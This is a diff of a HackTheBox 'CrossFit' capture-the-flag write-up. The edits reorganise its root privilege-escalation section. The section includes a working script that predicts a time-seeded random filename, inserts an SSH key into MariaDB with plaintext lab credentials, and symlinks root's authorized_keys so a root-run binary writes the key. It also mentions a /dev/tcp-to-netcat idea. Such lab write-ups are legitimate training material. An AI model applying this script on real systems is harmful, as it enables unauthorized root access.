@@ -31,10 +31,6 @@ NOTE: If the server is making use of self signed certificates you may need to ad
 lftp :~> set ssl:verify-certificate no
 ```
 
-**Useful thing 2**
-
-* description with generic example
-
 ## Enumeration
 
 ### Nmap scan
@@ -49,7 +45,9 @@ I started my enumeration with an nmap scan of `10.10.10.208`.  The options I reg
 | `-sV` | Does a service version scan |
 | `-oA $name` | Saves all three formats \(standard, greppable, and XML\) of output with a filename of `$name` |
 
-All this time I did not know that there were more levels of verbosity, I had just been using `-v` to get information as it was discovered instead of waiting for the scan to finish. I will be using `-vvv` from now on!
+{% hint style="info" %}
+All this time I did not know that there were more levels of verbosity, I had just been using **`-v`** to get information as it was discovered instead of waiting for the scan to finish. I will be using **`-vvv`** from now on!
+{% endhint %}
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
@@ -2041,18 +2039,6 @@ void process_data(void)
 
 The `process_data()` function opened a connection to the MySQL database and logged in.  Then it pulled all of the data from the `messages` table and stored the result in a variable. It then opened the file `/var/backups/mariadb/comments.zip`.  After opening the `messages` table and the zip file, it appears that the program takes each entry in the messages table and creates a file in `/var/local` using the `md5sum` of the random number it creates as the filename, then adds each file to the zip.  If I could create a file with the correct "random" filename in the `/var/local` directory and linked to a file of my choice before the program executed the write action, the output of my database entry in `message` would be written to the file \(and therefore to the linked file\).  Whew!
 
-```c
-if (local_40 != (FILE *)0x0) {
-          fputs((char *)local_38[1],local_40);
-          fputc(0x20,local_40);
-          fputs((char *)local_38[3],local_40);
-          fputc(0x20,local_40);
-          fputs((char *)local_38[2],local_40);
-          fclose(local_40);
-```
-
-My SQL entry into the `message` database was based off of this section of the code from the `process_data()` function.  It wrote the second field, the fourth field, then the third field to the file.  This means that it wrote them in the order name, message, email.  I would need to match my entries to this format.
-
 ```text
 isaac@crossfit:/dev/shm$ cd /var/backups/mariadb
 cd /var/backups/mariadb
@@ -2068,12 +2054,13 @@ I tried to see what was in the backup zip file to see if I could validate my ana
 
 int main(void)
 {
-    time_t t;
+    time_t tVar2
     
-    srand((unsigned) time(&t));
+    tVar2 = time((time_t *)0x0);
+    srand((uint)tVar2);
     printf("%d", rand());
 
-    return 0;
+    exit(0);
 }
 ```
 
@@ -2081,37 +2068,22 @@ I did some research into creating a random number seed using C and then printing
 
 * [https://www.tutorialspoint.com/c\_standard\_library/c\_function\_srand.htm](https://www.tutorialspoint.com/c_standard_library/c_function_srand.htm)
 * [https://stackoverflow.com/questions/7343833/srand-why-call-it-only-once](https://stackoverflow.com/questions/7343833/srand-why-call-it-only-once)
-* 
-I wrote a short function in C that emulated what the program was doing: using the current time to generate a pseudo-random number, then outputting that name.
+
+I wrote a short function in C that emulated what the program was doing: using the current time to generate a pseudo-random number, then outputting that name.  I would use a script to use md5sum on the generated number and write it to a file since that would be much easier than writing a whole C program to do this.
 
 ```text
 gcc rand.c -o /dev/shm/rand
 ```
 
-I compiled the small program, then created a script to run it, linking the file to root's authorized\_users \(which hopefully I could get to write to a location I could access!\).  
+I compiled the small program, then created a script to run it
 
 ```bash
-#!/bin/bash
-#testsploit.sh
-echo '#include <stdio.h>' >> rand.c
-echo '#include <stdlib.h>' >> rand.c
-echo '#include <time.h>' >> rand.c
-echo '' >> rand.c
-echo 'int main(void)' >> rand.c
-echo '{' >> rand.c
-echo '    char tmp[50];' >> rand.c
-echo '    srand(time(0));' >> rand.c
-echo '    printf("%d", rand());' >> rand.c
-echo '    return 0;' >> rand.c
-echo '}' >> rand.c
-gcc rand.c -o rand
-chmod +x ./rand
-mysql -h localhost -u crossfit -poeLoo~y2baeni -Dcrossfit -e'insert into messages (id, name, email, message) values (1, "ssh-ed25519", "zweilos@kali", "AAAAC3NzaC1lZDI1NTE5AAAAIEJBS4TOdiQGcHfw8ifVbRk+tgzUlRPyEn9ogY0JogFO");'
+#test.sh
 touch /var/local/testing
-while true; do ln -s /root/.ssh/authorized_keys /var/local/$(echo -n $(./rand)1 | md5sum | cut -d " " -f 1) 2>/dev/null; done
+while true; do ln -s /var/local/testing /var/local/$(echo -n $(./rand)1 | md5sum | cut -d " " -f 1) 2>/dev/null; done
 ```
 
-test script to see if I can write to random location and see if my output appears. update: test worked...this is final script, automating process because its a pain, and deletes every thing so fast...
+TODO:fix this paragraph., linking the file to root's `authorized_users`  and \(hopefully!\) writing my public SSH key to it.test script to see if I can write to random location and see if my output appears. update: test worked... automating process because its a pain, and deletes every thing so fast...The '1' after running my random number program is the ID field value from my SQL statement.
 
 ```text
 hank@crossfit:/var/local$ ls -la
@@ -2164,7 +2136,7 @@ hank@crossfit:/var/local$ cat *
 cat: d41d8cd98f00b204e9800998ecf8427e: No such file or directory
 ```
 
-my random files that were generated, and then suddenly and swiftly removed by the cleaning crew. I tried to do a test run, but the files were deleted so fast that I couldn't get the testing file to stick around. I thought about trying to get the output to redirect to /dev/tcp to show up at a nc listener on my machine, but I was confident that I had made it work and pushed on with trying to get `root` access.
+My random files that were generated, and then suddenly and swiftly removed by the cleaning crew. I tried to do a test run, but the files were deleted so fast that I couldn't get the testing file to stick around. I thought about trying to get the output to redirect to `/dev/tcp` to show up at a netcat listener on my machine, but I was confident that I had made it work and pushed on with trying to get `root` access.
 
 ```text
 isaac@crossfit:~$ vi rand.c
@@ -2201,7 +2173,7 @@ I scrolled up to check the error messages output from my script, and finally saw
 /dev/shm/test.sh: line 2: ./rand: No such file or directory
 ```
 
-The second error message above was caused
+I was also receiving the second error message above that was caused by a cleanup script on the machine which regularly deleted all files in the `/tmp`, `/var/local`, and `/dev/shm` directories \(and maybe more\).
 
 ```sql
 MariaDB [crossfit]> DESCRIBE messages;
@@ -2240,6 +2212,40 @@ I had to try a number of different entries, but in the end I had to break the pu
 | email | Username \(on attacker machine\) |
 | message | Public key content |
 
+```c
+if (local_40 != (FILE *)0x0) {
+          fputs((char *)local_38[1],local_40);
+          fputc(0x20,local_40);
+          fputs((char *)local_38[3],local_40);
+          fputc(0x20,local_40);
+          fputs((char *)local_38[2],local_40);
+          fclose(local_40);
+```
+
+My SQL entry into the `message` database was based off of this section of the code from the `process_data()` function.  It wrote the second field, the fourth field, then the third field to the file.  This means that it wrote them in the order: name, message, email.  These were separated by adding by a space \(`0x20`\) when it wrote to the file. I would need to match my entries to this format.
+
+```bash
+#!/bin/bash
+#testsploit.sh
+echo '#include <stdio.h>' >> rand.c
+echo '#include <stdlib.h>' >> rand.c
+echo '#include <time.h>' >> rand.c
+echo '' >> rand.c
+echo 'int main(void)' >> rand.c
+echo '{' >> rand.c
+echo '    srand(time(0));' >> rand.c
+echo '    printf("%d", rand());' >> rand.c
+echo '    return 0;' >> rand.c
+echo '}' >> rand.c
+gcc rand.c -o rand
+chmod +x ./rand
+mysql -h localhost -u crossfit -poeLoo~y2baeni -Dcrossfit -e'insert into messages (id, name, email, message) values (1, "ssh-ed25519", "zweilos@kali", "AAAAC3NzaC1lZDI1NTE5AAAAIEJBS4TOdiQGcHfw8ifVbRk+tgzUlRPyEn9ogY0JogFO");'
+touch /var/local/testing
+while true; do ln -s /root/.ssh/authorized_keys /var/local/$(echo -n $(./rand)1 | md5sum | cut -d " " -f 1) 2>/dev/null; done
+```
+
+I created a shell script to automate everything.  It wrote the C source code to a file, compiled it into a binary, gave it the executable permission, inserted my properly formatted SQL statement into the database, and finally linked `/root/.ssh/authorized_keys` to my randomly generated file. 
+
 ```text
 hank@crossfit:/var/local$ ls -la
 total 36
@@ -2252,7 +2258,7 @@ lrwxrwxrwx  1 isaac staff    26 Mar 19 17:22 c4ca4238a0b923820dcc509a6f75849b ->
 -rw-r--r--  1 isaac staff     0 Mar 19 17:22 testing
 ```
 
-I verified that the randomly generated file was symlinked to `/root/.ssh/authorized_keys`.
+I verified that the randomly generated file was symlinked to `/root/.ssh/authorized_keys` and hoped that everything worked as planned. 
 
 ### Root.txt
 
@@ -2295,7 +2301,7 @@ root@crossfit:~# cat root.txt
 ee0a62a5b513a67db05897a2ec478c80
 ```
 
-Finally! I had to keep trying to log in through SSH, as it wasn't until my files got deleted that I was successful. I was able to tell that my files got deleted because I began getting spammed with an error message
+Finally! I had to keep trying to log in through SSH, as it wasn't until my files got deleted that I was successful. I was able to tell that my files got deleted because I began getting spammed with an error message from my script.
 
 ```bash
 ...snipped...
@@ -2308,9 +2314,9 @@ Finally! I had to keep trying to log in through SSH, as it wasn't until my files
 
 As you can see...I got tired of even typing out `test.sh` and simply called my script `t`. I almost was about to write another script that would send my files over, `chmod +x` them, and run the exploit script, but just before I did that the exploit finally worked!
 
-TODO:These notes got jumbled up...make sure to clean and reorganize them!
+![](../../.gitbook/assets/0-crossfit-pwned.png)
 
-Thanks to [`polarbearer`](https://app.hackthebox.eu/users/159204) & [`GibParadox`](https://app.hackthebox.eu/users/125033) for something interesting or useful about this machine.
+Thanks to [`polarbearer`](https://app.hackthebox.eu/users/159204) & [`GibParadox`](https://app.hackthebox.eu/users/125033) for creating such a fun and challenging machine.  I am grateful that while it involved reverse engineering a C binary file, it did not involve advanced buffer overflows or anything like that \(looking at you Rope and Rope2...\).  I had to learn a number of new things to complete this machine such as writing code in JavaScript and C, both of which I am not that familiar.  Overall this was a great challenge and I definitely look forward to more like this!
 
 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
 
